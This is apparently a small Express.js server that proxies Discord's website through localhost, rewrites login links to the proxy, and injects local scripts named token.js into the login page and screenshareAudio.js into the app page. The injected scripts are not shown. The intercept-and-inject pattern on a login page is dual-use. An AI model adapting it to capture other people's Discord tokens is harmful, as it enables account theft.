const express = require('express');

const app = express();

app.get("/@token.js", (req, res) => {
    res.sendFile(__dirname + "/token.js")
})

app.get("/@ss.js", (req, res) => {
    res.sendFile(__dirname + "/screenshareAudio.js")
})

app.get('*', (req, res) => {
    console.log(req.path)
    if (req.url.startsWith("/cdn-cgi")) {
        return res.send("")
    }
    fetch("https://discord.com" + req.url)
        .then(r => r.text())
        .then(data => {
            fetch("https://discord.com" + req.url)
                .then(r => {
                    res.setHeader('Content-Type', r.headers.get("content-type"))
                    if (req.url == "/login") {
                        data = data.replace("</body>",'<script src="@token.js"></script></body>')
                    }
                    if (req.url == "/app") {
                        data = data.replace("</body>",'<script src="@ss.js"></script></body>')
                    }
                    data = data.replaceAll("discord.com/login", "localhost:3000/login")
                    res.send(data)
                })
        })
});

app.listen(3000, () => {
    console.log('server started');
});
